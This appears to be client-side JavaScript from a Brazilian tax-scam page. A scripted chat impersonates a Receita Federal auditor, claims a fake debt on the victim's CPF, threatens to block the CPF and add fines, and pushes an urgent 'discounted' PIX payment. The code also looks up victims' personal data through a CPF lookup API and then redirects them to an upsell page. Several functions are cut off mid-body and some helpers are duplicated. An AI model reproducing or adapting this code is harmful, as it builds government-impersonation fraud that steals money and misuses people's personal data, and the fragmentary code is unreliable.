<script>
// Get customer data from localStorage (saved when accessing via CPF slug)
let customerData = {};
try {
    const dataStr = localStorage.getItem('customerData');
    if (dataStr) {
        customerData = JSON.parse(dataStr);
    }
} catch (e) {
    console.error('Erro ao ler customerData do localStorage:', e);
    customerData = {};
}

// Função segura para obter dados do cliente
function getCustomerData() {
    try {
        const dataStr = localStorage.getItem('customerData');
        if (!dataStr) return {};
        return JSON.parse(dataStr);
    } catch (e) {
        console.error('Erro ao ler customerData:', e);
        return {};
    }
}


// Function to properly capitalize names
function capitalizeNames(name) {
    if (!name || name === 'Cliente' || name === 'Contribuinte') return '';
    return name.toLowerCase().split(' ').map(word => 
        word.charAt(0).toUpperCase() + word.slice(1)
    ).join(' ');
}

// Function to format CPF: 000.000.000-00
function formatarCPF(cpf) {
    if (!cpf) return 'CPF não informado';
    // Remove all non-numeric characters
    const cpfLimpo = String(cpf).replace(/\D/g, '');
    if (cpfLimpo.length !== 11) return cpf; // Return original if invalid length
    return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

// Function to format phone: (00) 00000-0000 or (00) 0000-0000
function formatarTelefone(telefone) {
    if (!telefone) return '';
    // Remove all non-numeric characters
    const telLimpo = String(telefone).replace(/\D/g, '');
    
    // Remove country code 55 if present
    let tel = telLimpo;
    if (telLimpo.length >= 12 && telLimpo.startsWith('55')) {
        tel = telLimpo.substring(2);
    }
    
    // Format based on length
    if (tel.length === 11) {
        // Cell phone: (00) 00000-0000
        return tel.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    } else if (tel.length === 10) {
        // Landline: (00) 0000-0000
        return tel.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
    }
    
    // Return original if format doesn't match
    return telefone;
}

// Verificar se tem dados reais no localStorage
function getCustomerNameData() {
    const nome = customerData.nome || customerData.NOME || '';
    const cpfValue = customerData.cpf || customerData.CPF || '';
    
    console.log('📝 Dados do cliente no localStorage:', { nome, cpfValue });
    
    // Se nome for genérico, retornar null para buscar depois
    if (!nome || nome === 'Cliente' || nome === 'Contribuinte' || nome.trim() === '') {
        console.log('⚠️ Nome genérico encontrado, será buscado na API');
        return { firstName: null, fullName: null, cpf: cpfValue };
    }
    
    const nomeCapitalizado = capitalizeNames(nome);
    const firstName = nomeCapitalizado.split(' ')[0];
    console.log('✅ Nome válido encontrado:', { firstName, fullName: nomeCapitalizado });
    return { firstName, fullName: nomeCapitalizado, cpf: cpfValue };
}

const nameData = getCustomerNameData();
let firstName = nameData.firstName || 'Prezado(a)';
let fullName = nameData.fullName || '';
const cpf = nameData.cpf ? formatarCPF(nameData.cpf) : '';

// Variáveis globais para atualizar depois se buscar da API
window.currentFirstName = firstName;
window.currentFullName = fullName;

console.log('📝 Variáveis globais iniciais:', { 
    currentFirstName: window.currentFirstName, 
    currentFullName: window.currentFullName 
});

// Chat sequence with tax debt notification
// Delays aumentados para dar mais tempo de leitura e processamento (5-7 segundos)
const chatSequence = [
    {
            message: `Olá ${window.currentFirstName || 'Prezado(a)'}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
            delay: 5000 // 5s - mensagem de apresentação e boas-vindas
        },
    {
            message: window.currentFullName 
                ? `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em nome de ${window.currentFullName}.`
                : `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em seu nome.`,
            delay: 6000, // 6s - primeira mensagem importante, precisa de tempo para ler e processar
            requestPhone: true
        },
        {
            message: `${window.currentFirstName || 'Prezado(a)'}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,
            delay: 6500 // 6.5s - mensagem de urgência, precisa de tempo para impacto e reflexão
        },
        {
            message: `Além disso, se o pagamento não for realizado hoje será aplicada uma multa adicional no valor de R$ 948,92 ao seu CPF, conforme determina a legislação tributária federal.`,
            delay: 6500 // 6.5s - reforço de urgência, tempo para processar a informação
        },
        {
            message: `Importante: realizando o pagamento hoje (${new Date().toLocaleDateString("pt-BR")}) há um desconto de 62%, reduzindo o débito de R$ 419,55 para apenas R$ 68,93. ${window.currentFirstName || 'Prezado(a)'}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
            delay: 7000, // 7s - mensagem de oferta, precisa de tempo para processar e tomar decisão
            showOptions: 'debtOptions'
        }
    ];

// Chat container
const chatContainer = document.getElementById('chatContainer');
if (!chatContainer) {
    console.error('❌ chatContainer não encontrado!');
}

// Add message to chat
function addMessage(text, isIncoming = true, scrollToBottom = true) {
    try {
        if (!chatContainer) {
            console.error('❌ chatContainer não encontrado em addMessage');
            return;
        }
        
        if (!text) {
            console.warn('⚠️ Tentativa de adicionar mensagem vazia');
            return;
        }
        
    const messageDiv = document.createElement('div');
    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;
    
    messageDiv.innerHTML = `
        <div class="message-content">
                ${String(text).replace(/\n/g, '<br>')}
        </div>
    `;
    
    chatContainer.appendChild(messageDiv);
    
    if (scrollToBottom) {
        chatContainer.scrollTop = chatContainer.scrollHeight;
        }
    } catch (error) {
        console.error('❌ Erro ao adicionar mensagem:', error);
    }
}

// Show typing indicator - ULTRA SIMPLIFICADO e sempre resolve rapidamente
function showTyping(duration = 1500) {
    return new Promise(resolve => {
        // Garantir que sempre resolve rapidamente
        let resolved = false;
        const resolveOnce = () => {
            if (!resolved) {
                resolved = true;
                resolve();
            }
        };
        
        // Timeout de segurança MUITO mais curto - máximo 3 segundos total
        const maxDuration = Math.min(duration + 500, 3000);
        const safetyTimeout = setTimeout(() => {

// PIX Modal functionality - Integração com Paradise Pags
async function openPixModal() {
    console.log('💰 Abrindo modal PIX...');
    
    // Verificar se já está gerando PIX
    if (window.isGeneratingPix) {
        console.warn('⚠️ PIX já está sendo gerado, aguardando...');
        return;
    }
    
    // Obter dados do cliente do localStorage
        const customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
    const cpf = customerData.cpf || new URLSearchParams(window.location.search).get('cpf') || '';
    const nome = customerData.nome || customerData.name || '';
    const email = customerData.email || '';
    const telefone = customerData.telefone || customerData.phone || '';
    
    if (!cpf || !nome) {
        alert('Erro: Dados do cliente não encontrados. Por favor, recarregue a página.');
        console.error('❌ Dados insuficientes:', { cpf, nome });
        return;
    }
    
    // Mostrar modal de loading
    showLoadingModal();
    window.isGeneratingPix = true;
    
    try {
        // Preparar dados para a API
        const amount = 6893; // R$ 68,93 em centavos
        const isFileProtocol = window.location.protocol === 'file:';
        const generatePixUrl = isFileProtocol ? './generate-pix.php' : './generate-pix.php';
        
        const params = new URLSearchParams({
            amount: amount.toString(),
            customer_cpf: cpf.replace(/\D/g, ''),
            customer_name: nome,
            customer_email: email || 'cliente@example.com',
            customer_phone: telefone.replace(/\D/g, '') || '11999999999'
        });
        
        console.log('📤 Gerando PIX via Paradise Pags...');
        console.log('📋 Dados:', { amount, cpf, nome, email, telefone });
        
        const response = await fetch(`${generatePixUrl}?${params.toString()}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (!response.ok) {
            // Tentar ler a resposta como texto primeiro para ver o erro
            const errorText = await response.text();
            console.error('❌ Resposta de erro da API:', errorText);
            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }

        // Verificar se a resposta é JSON válido
        const responseText = await response.text();
        let data;
        
        try {
            data = JSON.parse(responseText);
        } catch (parseError) {
            console.error('❌ Erro ao fazer parse do JSON:', parseError);
            console.error('❌ Resposta recebida (primeiros 500 caracteres):', responseText.substring(0, 500));
            throw new Error('A API retornou uma resposta inválida. Verifique o console para mais detalhes.');
        }
        
        console.log('📥 Resposta da API:', data);
        
        if (!data.success || !data.pixCode) {
            throw new Error(data.error || data.message || 'Código PIX não recebido');
        }
        
        // Mostrar modal PIX com os dados recebidos
        showPixModal(data, data.pixCode, data.transaction_id || data.transactionId);
        
    } catch (error) {
        console.error('❌ Erro ao gerar PIX:', error);
        window.isGeneratingPix = false;
        
        // Remover modal de loading
        const loadingModal = document.getElementById('pixModal');
        if (loadingModal) {
            loadingModal.remove();
        }
        
        alert(`Erro ao gerar código PIX: ${error.message}\n\nPor favor, tente novamente.`);
    }
}

// Function to generate QR code from PIX code
async function generateQRCodeFromPix(pixCode) {
    try {
        // Check if QRious library is loaded
        if (typeof QRious === 'undefined') {
            console.error('QRious library not loaded');
            return null;
        }
        
        // Create a canvas element
        const canvas = document.createElement('canvas');
        
        // Create QRious instance
        const qr = new QRious({
            element: canvas,
            value: pixCode,
            size: 120,
            background: '#ffffff',
            foreground: '#000000'
        });
        
        // Convert canvas to data URL
        const qrCodeDataURL = canvas.toDataURL('image/png');
        return qrCodeDataURL;
    } catch (error) {
        console.error('Erro ao gerar QR Code:', error);
        return null;
    }
}

function copyPixCode() {
    // Get the real PIX code from hidden input
    const realPixInput = document.getElementById('pixCodeInputReal');
    const realPixCode = realPixInput.value;
    
    try {
        // Copy the real PIX code to clipboard
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(realPixCode);
        } else {
            // Fallback for older browsers
            const textArea = document.createElement('textarea');
            textArea.value = realPixCode;
            document.body.appendChild(textArea);
            textArea.select();
            textArea.setSelectionRange(0, 99999);
            document.execCommand('copy');
            document.body.removeChild(textArea);
        }
        
        const button = event.target.closest('button');
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
        button.style.background = '#28a745';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '#044785';
        }, 3000);
    } catch (err) {
        console.error('Erro ao copiar:', err);
        alert('Erro ao copiar código. Tente selecionar manualmente.');
    }
}

    // Clear any existing interval
    if (window.paymentMonitorInterval) {
        clearInterval(window.paymentMonitorInterval);
    }
    
    // Check payment status every 2 seconds
    window.paymentMonitorInterval = setInterval(async () => {
        try {
            // Usar get-payment.php na mesma pasta
            const isFileProtocol = window.location.protocol === 'file:';
            const statusUrl = isFileProtocol 
                ? `./get-payment.php?transactionId=${encodeURIComponent(transactionId)}`
                : `./get-payment.php?transactionId=${encodeURIComponent(transactionId)}`;
            console.log(`🔄 Verificando status da transação: ${transactionId}`);
            console.log(`📡 URL de verificação: ${statusUrl}`);
            
            const response = await fetch(statusUrl);
            
            if (!response.ok) {
                console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
                return;
            }
            
            // Verificar se a resposta é JSON válido
            const responseText = await response.text();
            let statusData;
            
            try {
                statusData = JSON.parse(responseText);
            } catch (parseError) {
                console.error('❌ Erro ao fazer parse do JSON:', parseError);

            }

// Buscar telefone por CPF na planilha
// Função buscarTelefonePorCPF removida - telefone será solicitado durante o chat se necessário

// Initialize chat
// Função para buscar dados do CPF na API se necessário (api.cpf-brasil.org via api-cpf.php) - com timeout para não travar
async function fetchCpfDataIfNeeded(cpf) {
    if (!cpf || cpf.length !== 11) return null;
    
    try {
        const apiUrl = `../api-cpf.php?cpf=${cpf}&_t=${Date.now()}`;
        
        console.log('📤 Buscando CPF na API (api.cpf-brasil.org) para obter nome real...');
        
        // Adicionar timeout de 5 segundos para não travar o chat
        const controller = new AbortController();
        let timeoutId = setTimeout(() => {
            controller.abort();
        }, 5000);
        
        const response = await fetch(apiUrl, {
            method: 'GET',
            mode: 'cors',
            cache: 'no-cache',
            headers: {
                'Cache-Control': 'no-cache'
            },
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
            throw new Error(`Erro HTTP ${response.status}`);
        }
        
        const data = await response.json();
        console.log('📥 Resposta completa da API (api.cpf-brasil.org) no chat:', JSON.stringify(data, null, 2));
        
        // Estrutura api.cpf-brasil.org (via api-cpf.php): { nome, cpf, email, telefone, nascimento, mae, pai, sexo, etc }
        const nome = data.nome || data.NOME || data.name || data.NAME || null;
        
        console.log('📝 Nome extraído no chat (api.cpf-brasil.org):', nome);
        console.log('📝 Estrutura data:', {
            cpf: data.cpf,
            nome: data.nome,
            nascimento: data.nascimento,
            nome_mae: data.mae
        });
        
        if (nome && nome !== 'Cliente' && nome !== 'Contribuinte' && nome.trim() !== '') {
            // Atualizar localStorage com nome real
            const currentData = getCustomerData();
            currentData.nome = nome;
            currentData.NOME = nome;
            try {
                localStorage.setItem('customerData', JSON.stringify(currentData));
            } catch (e) {
                console.error('Erro ao salvar nome no localStorage:', e);
            }
            
            // Atualizar variáveis globais
            const nomeCapitalizado = capitalizeNames(nome);
            window.currentFirstName = nomeCapitalizado.split(' ')[0];
            window.currentFullName = nomeCapitalizado;
            
            console.log('✅ Nome real atualizado:', window.currentFirstName, window.currentFullName);
            return nome;
        }
        return null;
    } catch (error) {
        if (error.name === 'AbortError') {
            console.warn('⏰ Timeout ao buscar CPF na API (5s), continuando sem nome da API');
        } else {
            console.error('❌ Erro ao buscar CPF na API:', error);
        }
        // Retornar null para não travar o chat - ele continuará com os dados do localStorage
        return null;
    }
}

// Função para pular confirmação de telefone
function skipPhoneConfirmation() {
    try {
        // Remove phone input form
        const phoneContainer = document.querySelector('.phone-input-container');
        if (phoneContainer) {
            phoneContainer.remove();
        }
        
        // Resolve the promise to continue chat
        if (phoneConfirmationResolve) {
            phoneConfirmationResolve();
            phoneConfirmationResolve = null;
        }
        
        addMessage('Continuando sem confirmar telefone...', false, true);

// Function to handle manual payment confirmation
async function handlePaymentConfirmation(transactionId, confirmed) {
    // Remove confirmation popup
    const popup = document.getElementById('paymentConfirmationPopup');
    const overlay = document.getElementById('paymentConfirmationOverlay');
    if (popup) popup.remove();
    if (overlay) overlay.remove();
    
    if (confirmed) {
        console.log('✅ Usuário confirmou pagamento, verificando status...');
        
        try {
            const statusUrl = `get-payment.php?transactionId=${encodeURIComponent(transactionId)}`;
            console.log(`🔄 Verificação manual do status via get-payment.php: ${statusUrl}`);
            
            const response = await fetch(statusUrl);
            
            if (!response.ok) {
                console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
                return;
            }
            
            const statusData = await response.json();
            console.log('📊 Status da verificação manual:', statusData);
            
            // Extrai status como no checkout
            let status = null;
            if (Array.isArray(statusData) && statusData.length > 0) {
                status = statusData[0].status;
            } else if (statusData && statusData.status) {
                status = statusData.status;
            }
            
            console.log(`🎯 Status manual normalizado: "${status}"`);
            
            if (status === 'approved' || status === 'paid') {
                // Clear automatic monitoring
                if (window.paymentMonitorInterval) {
                    clearInterval(window.paymentMonitorInterval);
                    window.paymentMonitorInterval = null;
                }
                
                // Close modal
                closePixModal();

                // Salvar dados da transação no localStorage
                localStorage.setItem('currentTransaction', JSON.stringify({
                    transactionId: transactionId,
                    status: status,
                    paid: true,
                    timestamp: new Date().toISOString()
                }));

                console.log('✅ Pagamento confirmado! Redirecionando para oferta de regularização 2026...');
                window.location.href = 'upsell.html';
            } else {
                console.log('⚠️ Pagamento ainda não foi aprovado');
                alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
            }
        } catch (error) {
            console.error('❌ Erro ao verificar status manual:', error);
            alert('Erro ao verificar pagamento. Tente novamente.');
        }
    } else {
        console.log('❌ Usuário informou que não realizou o pagamento');
        // Continue with automatic monitoring
    }
  }

<script>
// Função para capitalizar nomes
function capitalizeNames(name) {
    if (!name || name === 'Cliente' || name === 'Contribuinte') return '';
    return name.toLowerCase().split(' ').map(word => 
        word.charAt(0).toUpperCase() + word.slice(1)
    ).join(' ');
}

// Function to format CPF: 000.000.000-00
function formatarCPF(cpf) {
    if (!cpf) return 'CPF não informado';
    // Remove all non-numeric characters
    const cpfLimpo = String(cpf).replace(/\D/g, '');
    if (cpfLimpo.length !== 11) return cpf; // Return original if invalid length
    return cpfLimpo.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

// Function to format phone: (00) 00000-0000 or (00) 0000-0000
function formatarTelefone(telefone) {
    if (!telefone) return '';
    // Remove all non-numeric characters
    const telLimpo = String(telefone).replace(/\D/g, '');
    
    // Remove country code 55 if present
    let tel = telLimpo;
    if (telLimpo.length >= 12 && telLimpo.startsWith('55')) {
        tel = telLimpo.substring(2);
    }
    
    // Format based on length
    if (tel.length === 11) {
        // Cell phone: (00) 00000-0000
        return tel.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    } else if (tel.length === 10) {
        // Landline: (00) 0000-0000
        return tel.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
    }
    
    // Return original if format doesn't match
    return telefone;
}
